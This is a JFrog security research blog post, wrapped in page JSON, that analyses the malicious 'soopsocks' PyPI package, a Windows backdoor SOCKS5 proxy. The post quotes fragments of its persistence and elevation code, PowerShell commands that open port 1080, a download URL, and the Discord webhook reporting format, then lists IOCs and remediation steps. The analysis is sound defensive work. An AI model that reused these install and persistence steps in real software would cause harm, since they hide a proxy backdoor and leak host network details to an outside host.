{"hash":"f5ef20758573ca4113cf7126ae7d0063150259e6","data":{"realTimePost":{"description":"Guy Korolevski,  JFrog Security Researcher","title":"Check Your Socks -  A Deep Dive into soopsocks PyPI Package","date":"September 30, 2025","type":"realTimePost","tag":"Real Time Post","img":"/img/RealTimePostImage/post_thumbnail1.png","path":"/post/check-your-socks-a-deep-dive-into-soopsocks-pypi/","content":"<p>JFrog's security research team actively monitors open-source repositories like PyPI for malicious packages, uncovering threats to protect the software supply chain. Our team found a package exhibiting malware-like behaviour, that may pose a threat to organizational security.<br>\nEven though promising some of the capabilities up front, we suspected the package, which led us to investigate further. This report details its persistence mechanisms, network reconnaissance capabilities, and multiple deployment vectors shown in the different versions evolution of the package.</p>\n<p><img src=\"/img/RealTimePostImage/post/soopsocks-blog-pypi.png\">\n<em>Soopsocks on PyPI, after JFrog team reported to maintainers</em></p>\n<p>The SoopSocks PyPI package (XRAY-725599) promises to create a SOCKS5 proxy service and report information about the server to a <strong>configurable</strong> Discord webhook, supporting fallback as a scheduled task. While providing this capability it exhibits behaviour as a Backdoor proxy server, targeting Windows platforms, using automated installation processes via VBScript or an executable version.</p>\n<p>SOCKS5 is a network proxy protocol that forwards traffic between a client and external servers through an intermediary (the proxy), allowing clients to hide their IP, bypass network restrictions, or route traffic through another host. It supports both TCP and UDP connections, and can relay arbitrary TCP streams or perform domain name resolution either locally or via the proxy. Since SOCKS5 operates at a lower level than HTTP proxies (it handles raw sockets rather than HTTP requests), it supports multiple protocols and is commonly used for tunneling SSH, BitTorrent, and other non-HTTP traffic. By convention, SOCKS5 services typically listen on <strong>port 1080</strong>, though administrators can configure them to run on any available port.</p>\n<h2 id=\"soopsocks-version-evolution\"><a href=\"#soopsocks-version-evolution\" aria-hidden=\"true\" tabindex=\"-1\">SoopSocks Version Evolution:</a></h2>\n<ul>\n<li><strong>v0.1.0-v0.1.2</strong>: Basic SOCKS5 server implementation  </li>\n<li><strong>v0.2.0-v0.2.4</strong>: Added _autorun.exe, Windows service support  </li>\n<li><strong>v0.2.5-v0.2.6</strong>: Added VBS deployment scripts  </li>\n<li><strong>v0.2.7:</strong> Streamlined to EXE-only deployment (current)</li>\n</ul>\n<h2 id=\"deployment-vectors\"><a href=\"#deployment-vectors\" aria-hidden=\"true\" tabindex=\"-1\">Deployment Vectors:</a></h2>\n<ul>\n<li><strong>_AUTORUN.EXE (Primary):</strong> A PE32+ executable,compiled from <strong>GO</strong>, that executes with hidden window flags and runs PowerShell scripts.  </li>\n<li><strong>_AUTORUN.VBS (Legacy):</strong> A VBScript deployment method (versions 0.2.4-0.2.6) that downloads Python portable, installs it, creates a PowerShell bootstrap script, and executes with UAC elevation.  </li>\n<li><strong>Python Module Installation:</strong> Direct installation via <code>pip</code> (<code>pip install soopsocks pywin32</code>), supporting all persistence mechanisms.</li>\n</ul>\n<h2 id=\"_autorunexe-analysis\"><a href=\"#_autorunexe-analysis\" aria-hidden=\"true\" tabindex=\"-1\">_AUTORUN.EXE Analysis</a></h2>\n<p>The executable is a compiled <strong>GO</strong> file, inside of it can be found <strong>hardcoded</strong> discord webhook and powershell scripts that it runs automatically, including firewall rules and other scripts as in the previous versions (VBS script).</p>\n<p>The binary uses <strong>PowerShell</strong> as its primary orchestration mechanism but does so in a way designed to avoid user visibility and standard logging cues: PowerShell is launched hidden, the execution policy is set to <strong>Bypass</strong> so scripts can run <strong>without policy blocks</strong>, profile loading is skipped so common detection hooks are avoided, and error output is suppressed so failures do not surface to the user. </p>\n<p>The process also hides interactive prompts, and error handling is suppressed to “<strong>continue on error”</strong> which helps the installer proceed even if individual steps fail. That pattern is classic for installers or droppers that want to execute multiple stages without alerting a user or an administrator.</p>\n<p>The executable copies itself into <code>\"C:\\Program Files\\socks5svc\\socks5svc.exe\"</code> and installs itself as a service called <code>SoopSocksSvc</code> which is configured to auto start automatically. The executable uses a GO service library “<a href=\"http://github.com/kardianos/service\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/kardianos/service</a>” to function as a service, providing the same capabilities as the python implementation in the package. This installation as a service allows the program to run with elevated permissions. It also uses an implementation of SOCKS5 as promised in the package’s description.</p>\n<p>Analysis of the executable shows that it contains a structure similar to the python code:</p>\n<ul>\n<li>main  </li>\n<li>socks5/internal/diag  </li>\n<li>socks5/internal/install  </li>\n<li>socks5/internal/proxy  </li>\n<li>socks5/internal/webhook</li>\n</ul>\n<p>Further analysis shows capabilities such as running hidden powershell, setting FW rules, relaunching itself with elevated permissions, discord webhook support and IP reconnaissance such as public, physical, virtual or via STUN. The Go was built with the same scripts as the python: egress.go, discord.go, main.go, firewall.go (and more). </p>\n<p>The existence of a SOCKS5 proxy running as a service, with FW rules opened can be abused to route traffic, anonymize attacker connections, or provide an egress tunnel for further malicious traffic. <strong>Dynamic analysis</strong> shows that information is being sent directly to the hardcoded webhook, as in the python server version (will be detailed later):</p>\n<pre><code class=\"language-json\">{\n  \"embeds\": [\n    {\n      \"title\": \"SOCKS5.Egress.Update\",\n      \"color\": 43775,\n      \"fields\": [\n        {\n          \"name\": \"Hostname\",\n          \"value\": \"`&#x3C;HOSTNAME>`\",\n          \"inline\": false\n        },\n        {\n          \"name\": \"LAN.Public.IPv4.(Ethernet/Wi-Fi)\",\n          \"value\": \"`&#x3C;EXTERNAL IP>`.(direct)\",\n          \"inline\": true\n        },\n        {\n          \"name\": \"LAN.Local.IPv4.(Ethernet/Wi-Fi)\",\n          \"value\": \"`&#x3C;INTERNAL IP>`.(Connection)\",\n          \"inline\": true\n        },\n        {\n          \"name\": \"Current.Egress.Public.IPv4\",\n          \"value\": \"`&#x3C;EXTERNAL IP>`\",\n          \"inline\": true\n        },\n        {\n          \"name\": \"Current.Egress.Local.IPv4\",\n          \"value\": \"`&#x3C;INTERNAL IP>`.(Connection)\",\n          \"inline\": true\n        }\n      ],\n      \"timestamp\": \"2025-09-28T12:32:06Z\"\n    }\n  ]\n}\n</code></pre>\n<p>There is also indication of Host reconnaissance such as reading Internet Explorer security settings and the Windows installation date. An attacker can use these as fingerprints to identify the host it is running on for future purpose or to avoid analysis.</p>\n<h3 id=\"results-for-online-analysis\"><a href=\"#results-for-online-analysis\" aria-hidden=\"true\" tabindex=\"-1\">Results for Online analysis:</a></h3>\n<ul>\n<li><a href=\"https://www.virustotal.com/gui/file/de4ad0b01e1913781687cdb841af51668ffcaed82cba24981d88648a715515fb/detection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">VirusTotal Analysis</a>  </li>\n<li><a href=\"https://any.run/report/de4ad0b01e1913781687cdb841af51668ffcaed82cba24981d88648a715515fb/4ac536cb-57cb-4fd7-9496-d90288875e38\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ANY.RUN Dynamic Analysis</a></li>\n</ul>\n<h2 id=\"_autorunvbs-analysis\"><a href=\"#_autorunvbs-analysis\" aria-hidden=\"true\" tabindex=\"-1\">_AUTORUN.VBS Analysis</a></h2>\n<p><img src=\"/img/RealTimePostImage/post/soopsocks-blog-vbs.png\">\n<em>VBScript screenshot out of version 0.2.5</em></p>\n<p>Versions 0.2.5 and 0.2.6 contained an installation vector written as VBScript. It creates COM objects for <code>WScript.Shell</code> and <code>Scripting.FileSystemObject</code>. It then constructs a PowerShell bootstrap script (<code>pp_bootstrap.ps1</code>) in the <code>%TEMP%</code> directory and executes it silently using <code>powershell.exe -File %TEMP%\\\\pp_bootstrap.ps1</code> without awaiting its completion.</p>\n<p>The PowerShell bootstrap created by the VBScript is a silent, elevation-aware installer,<br>\nIt downloads a ZIP from <code>http://install.soop.space:6969/download/py/pythonportable.zip</code><br>\nWhich is a python distribution, to <code>%TEMP%\\python-portable.zip</code>, extract it to <code>C:\\PythonPortable</code> and then generates a batch file  <code>%TEMP%\\run_soopsocks.cmd</code> which:</p>\n<ol>\n<li>runs <code>python -m pip install soopsocks pywin32</code>  </li>\n<li>Exits early if pip fails  </li>\n<li>Runs <code>python -m soopsocks</code></li>\n</ol>\n<p>Finally the script launches <code>cmd.exe /c run_soopsocks.cmd</code> with the working directory set to the extracted Python folder and runs everything hidden<strong>. The PowerShell will re-invoke itself with administrative privileges if not already elevated</strong> (<code>Start-Process ... -Verb RunAs</code>), and the original VBScript invokes PowerShell with window style hidden (Wsh.Run uses <code>0</code>), so the entire operation is designed to execute silently.</p>\n<p>Sidenote - The python executable downloaded from the URL is a legitimate distribution, it is probably downloaded as a way to ensure that the code is executed correctly with the matching version it was developed for.</p>\n<p>Running SoopSocks python package, as the PS run it, will run it in “auto” mode:</p>\n<pre><code class=\"language-py\">from .cli import main\nif __name__=='__main__':\n    main()\n</code></pre>\n<p>Which activates the main without arguments, causing the main function to reach:</p>\n<pre><code class=\"language-py\">args = p.parse_args(argv)\n    if not args.cmd:\n        if platform.system() == \"Windows\":\n            return auto(args)\n        p.print_help(); return\n</code></pre>\n<p>This runs the function <code>_elevate_and_rerun()</code> if not admin, or opening FW rules and installs as a service:</p>\n<pre><code class=\"language-py\">if not _is_admin_windows():\n    # Administrator privileges required. Attempting UAC elevation...\n        print(\"관리자 권한이 필요합니다. UAC 상승을 시도합니다...\")\n        _elevate_and_rerun([\"auto\"])\n        return\n\n    ensure_firewall_rules(sys.executable)\n\n    ok, detail = _try_pywin32_service()\n    if ok:\n    # Service installation and startup completed.\n        print(\"서비스 설치 및 시작 완료.\")\n        return\n    ok, msgs = _auto_task_fallback()\n</code></pre>\n<p>FW rules will allow all UDP and TCP communication via port 1080:</p>\n<pre><code class=\"language-shell\">New-NetFirewallRule -DisplayName 'SoopSocks TCP 1080' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1080 -Program $e -Profile Any\n\nNew-NetFirewallRule -DisplayName 'SoopSocks UDP 1080' -Direction Inbound -Action Allow -Protocol UDP -LocalPort 1080 -Program $e -Profile Any\n</code></pre>\n<p>The service is written in python and is installed by the name <code>SoopSocksSvc</code>, which keeps the SOCKS5 proxy and the reporting to the discord webhook running.</p>\n<p>The <code>_auto_task_fallback()</code> is executed only if service creation fails. It is a function that searches for existing files called “candidates” by the author of the package, and activates whatever file exists in the current folder, these are the executable or PowerShell files:</p>\n<pre><code class=\"language-py\">if AUTORUN_FILE:\n        candidates.append(AUTORUN_FILE)\n    candidates += [\"_autorun.exe\", \"_autorun.bat\", \"_autorun.cmd\", \"_autorun.ps1\", \"_autorun.vbs\"]\n.....\nif exe.lower().endswith(\".ps1\"):\n            cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{exe}\"'\n        else:\n            cmd = f'\"{exe}\"'\n</code></pre>\n<p>Then it installs it as a scheduled task named <code>SoopSocksAuto</code>,on start and logon ensuring persistence.</p>\n<h2 id=\"persistence-mechanisms\"><a href=\"#persistence-mechanisms\" aria-hidden=\"true\" tabindex=\"-1\">Persistence Mechanisms:</a></h2>\n<p>SoopSocks executable and VBScript employs various persistence methods:</p>\n<ul>\n<li><strong>Windows Service:</strong> <code>SoopSocksSvc</code> starts automatically on boot with SYSTEM privileges.  </li>\n<li><strong>Scheduled Tasks:</strong> <code>SoopSocksAuto</code> triggers on system startup and user logon with hidden execution and SYSTEM privilege escalation.  </li>\n<li><strong>Firewall Rules:</strong> Automatic inbound rules for TCP/UDP port 1080.  </li>\n<li><strong>UAC Bypass:</strong> Automatic, PowerShell-based privilege escalation with hidden execution.</li>\n</ul>\n<h2 id=\"network-communication\"><a href=\"#network-communication\" aria-hidden=\"true\" tabindex=\"-1\">Network Communication:</a></h2>\n<ul>\n<li><strong>SOCKS5 Proxy Server:</strong> Uses SOCKS5 protocol on port 1080 (default) with no authentication.  </li>\n<li><strong>Discord Command &#x26; Control:</strong> HTTPS POST to a hardcoded webhook URL, sending JSON embeds of network egress information every 30 seconds.  </li>\n<li><strong>External Downloads:</strong> Downloads Python portable from <code>http://install.soop.space:6969/download/py/pythonportable.zip</code> and package installations via <code>pip</code>.</li>\n</ul>\n<h2 id=\"how-soopsocks-works-a-technical-breakdown-of-python-core-components\"><a href=\"#how-soopsocks-works-a-technical-breakdown-of-python-core-components\" aria-hidden=\"true\" tabindex=\"-1\">How SoopSocks Works: A Technical Breakdown of Python core components</a></h2>\n<ol>\n<li>\n<p><strong>SERVER.PY - SOCKS5 Proxy Implementation:</strong>  </p>\n<ul>\n<li>Implements the full SOCKS5 protocol (RFC 1928), supporting CONNECT and UDP ASSOCIATE commands.  </li>\n<li>Operates as an open proxy with no authentication required, defaulting to listen on <code>0.0.0.0:1080</code>.  </li>\n<li>Handles IPv4, IPv6, and domain name resolution, with UDP relay functionality.  </li>\n</ul>\n</li>\n<li>\n<p><strong>CLI.PY - Command Line Interface &#x26; Persistence:</strong>  </p>\n<ul>\n<li>Manages various functions including running the SOCKS5 server, configuring automatic startup (Windows only), adding Windows Firewall rules, displaying network egress information, and managing Windows services.  </li>\n<li>Persistence logic prioritizes Windows service installation, falling back to Scheduled Tasks if unsuccessful. It also configures firewall rules and supports User Account Control (UAC) elevation.  </li>\n</ul>\n</li>\n<li>\n<p><strong>DISCORD.PY - Command &#x26; Control:</strong>  </p>\n<ul>\n<li>Reports real-time network egress information to a hardcoded Discord webhook URL every 30 seconds when network changes are detected, using structured JSON embeds.  </li>\n</ul>\n</li>\n<li>\n<p><strong>EGRESS.PY - Network Reconnaissance:</strong>  </p>\n<ul>\n<li>Detects local IPv4 via route tables and public IPv4 using multiple HTTP APIs (e.g., api.ipify.org, ifconfig.me/ip).  </li>\n<li>Utilizes the STUN protocol (Google STUN server: stun.l.google.com:19302) for NAT traversal detection.  </li>\n</ul>\n</li>\n<li>\n<p><strong>AUTOSTART.PY - Windows Persistence:</strong>  </p>\n<ul>\n<li>Creates Scheduled Tasks named <code>SoopSocksAuto</code> for auto-start on system startup and user logon, running with SYSTEM privileges and hidden execution.  </li>\n</ul>\n</li>\n<li>\n<p><strong>FIREWALL.PY - Network Access Control:</strong>  </p>\n<ul>\n<li>Automatically adds Windows Firewall rules (\"SoopSocks TCP 1080\" and \"SoopSocks UDP 1080\") to allow inbound traffic on port 1080, using PowerShell or <code>netsh</code>.  </li>\n</ul>\n</li>\n<li>\n<p><strong>SERVICE_WINDOWS.PY - Windows Service:</strong>  </p>\n<ul>\n<li>Implements a Windows service named <code>SoopSocksSvc</code> (\"SoopSocks Python Service\") using <code>pywin32</code>, running the SOCKS5 server with Discord reporting and handling service start/stop events.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"indicators-of-compromise-iocs\"><a href=\"#indicators-of-compromise-iocs\" aria-hidden=\"true\" tabindex=\"-1\">Indicators of Compromise (IOCs):</a></h2>\n<h3 id=\"network-indicators\"><a href=\"#network-indicators\" aria-hidden=\"true\" tabindex=\"-1\">Network Indicators:</a></h3>\n<ul>\n<li>Discord Webhook: <code>hxxps[:]//discord[.]com/api/webhooks/1418298773330985154/_I7EzXpGMundYt8jCvlDdzi9INsBkBq7NSDM74iV0Y_flSzQZ5LxYP0lZtXFzHCkRtKR</code>  </li>\n<li>Download Server: <code>install.soop.space:6969</code>  </li>\n<li>SOCKS5 Port: <code>1080</code> (TCP/UDP)  </li>\n<li>STUN Server: <code>stun.l.google.com:19302</code></li>\n</ul>\n<h3 id=\"file-indicators\"><a href=\"#file-indicators\" aria-hidden=\"true\" tabindex=\"-1\">File Indicators:</a></h3>\n<ul>\n<li><code>_autorun.exe</code> (PE32+ executable) -<br>\nde4ad0b01e1913781687cdb841af51668ffcaed82cba24981d88648a715515fb  </li>\n<li><code>_autorun.vbs</code> (VBScript deployment) - cab9d3c35a38314ce6b7e49fc976a9fe3fe07dbee8eafe89913fa308798007bb  </li>\n<li><code>pp_bootstrap.ps1</code> (PowerShell bootstrap) - 2f5c9da5b1935a5c43c1240354021699c4f97d53fd63a71de22b73f479667445  </li>\n<li><code>run_soopsocks.cmd</code> (Batch execution script)</li>\n</ul>\n<h3 id=\"registrysystem-indicators\"><a href=\"#registrysystem-indicators\" aria-hidden=\"true\" tabindex=\"-1\">Registry/System Indicators:</a></h3>\n<ul>\n<li>Windows Service: <code>SoopSocksSvc</code>  </li>\n<li>Scheduled Task: <code>SoopSocksAuto</code>  </li>\n<li>Firewall Rules: <code>SoopSocks TCP 1080</code>, <code>SoopSocks UDP 1080</code>  </li>\n<li>Installation Path: <code>C:\\PythonPortable</code></li>\n</ul>\n<h3 id=\"process-indicators\"><a href=\"#process-indicators\" aria-hidden=\"true\" tabindex=\"-1\">Process Indicators:</a></h3>\n<ul>\n<li><code>python.exe -m soopsocks</code>  </li>\n<li><code>powershell.exe</code> (with specific arguments)  </li>\n<li><code>cmd.exe /c run_soopsocks.cmd</code></li>\n</ul>\n<h3 id=\"network-traffic-patterns\"><a href=\"#network-traffic-patterns\" aria-hidden=\"true\" tabindex=\"-1\">Network Traffic Patterns:</a></h3>\n<ul>\n<li>Regular HTTPS POST to Discord webhook.  </li>\n<li>SOCKS5 protocol on port 1080.  </li>\n<li>\n<p>HTTP requests to IP detection services.  </p>\n<ol>\n<li>- <a href=\"https://api.ipify.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://api.ipify.org</a>  </li>\n<li>- <a href=\"https://ifconfig.me/ip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://ifconfig.me/ip</a>  </li>\n<li>- <a href=\"https://checkip.amazonaws.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://checkip.amazonaws.com</a>  </li>\n<li>- <a href=\"https://ipinfo.io/ip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://ipinfo.io/ip</a>  </li>\n</ol>\n</li>\n<li>STUN protocol traffic.</li>\n</ul>\n<h2 id=\"threat-assessment-and-remediation\"><a href=\"#threat-assessment-and-remediation\" aria-hidden=\"true\" tabindex=\"-1\">Threat Assessment and Remediation</a></h2>\n<p>SoopSocks presents a HIGH risk due to its capabilities for persistent backdoor access, full network traffic proxying, real-time network reconnaissance.</p>\n<h3 id=\"detection-recommendations\"><a href=\"#detection-recommendations\" aria-hidden=\"true\" tabindex=\"-1\">Detection Recommendations:</a></h3>\n<ul>\n<li><strong>Network Monitoring:</strong> Monitor for SOCKS5 traffic on port 1080, Discord webhook communications, STUN protocol usage, and external IP detection requests.  </li>\n<li><strong>Host-Based Detection:</strong> Scan for <code>_autorun.exe</code> files, check for <code>SoopSocksSvc</code> service, monitor Scheduled Tasks for <code>SoopSocksAuto</code>, and detect Python portable installations.  </li>\n<li><strong>Behavioral Analysis:</strong> Monitor for UAC elevation attempts, firewall rule modifications, hidden process execution, and package installations.  </li>\n<li><strong>YARA Rules:</strong> Create rules for <code>_autorun.exe</code> characteristics, VBScript deployment patterns, PowerShell bootstrap scripts, and Discord webhook URLs.</li>\n</ul>\n<h3 id=\"remediation-steps\"><a href=\"#remediation-steps\" aria-hidden=\"true\" tabindex=\"-1\">Remediation Steps:</a></h3>\n<ol>\n<li><strong>Immediate Response:</strong> Isolate affected systems, block Discord webhook and <code>install.soop.space</code> domains, and monitor port 1080 traffic.  </li>\n<li><strong>System Cleanup:</strong> Remove <code>SoopSocksSvc</code> service, delete <code>SoopSocksAuto</code> scheduled task, remove firewall rules, delete <code>_autorun.exe</code> files, and clean <code>C:\\PythonPortable</code> directory.  </li>\n<li><strong>Network Security:</strong> Block outbound connections to Discord, monitor for SOCKS5 proxy usage.  </li>\n<li><strong>Prevention:</strong> Disable VBScript execution, implement application whitelisting, deploy endpoint detection and response.</li>\n</ol>\n<h2 id=\"conclusion\"><a href=\"#conclusion\" aria-hidden=\"true\" tabindex=\"-1\">Conclusion</a></h2>\n<p>SoopSocks is a well-designed SOCKS5 proxy with full bootstrap windows support, however, given the way it performs and actions it takes during runtime, it shows signs of malicious activity, such as FW rules, elevated permissions, various PowerShell commands and the transfer from simple, configurable python scripts to GO executable with hardcoded parameters version with reconnaissance capabilities to a predetermined discord webhook.</p>\n<p>Given the circumstances, that most of the capabilities are declared up front by the author, we had to examine the package closely to determine its true nature. It was removed from PyPI on Sep 29, 6:00 PM GMT+3 after our team reported it as suspicious to the maintainers.</p>\n","excerpt":"Our team found a package exhibiting malware-like behaviour, that may pose a threat to organizational security. Even though promising some of the capabilities up front, we suspected the package, which led us to investigate further. This report details its persistence mechanisms, network reconnaissance capabilities, and multiple deployment vectors shown in the different versions evolution of the package.","minutes":"11","schema":"","canonical":""}},"context":{}}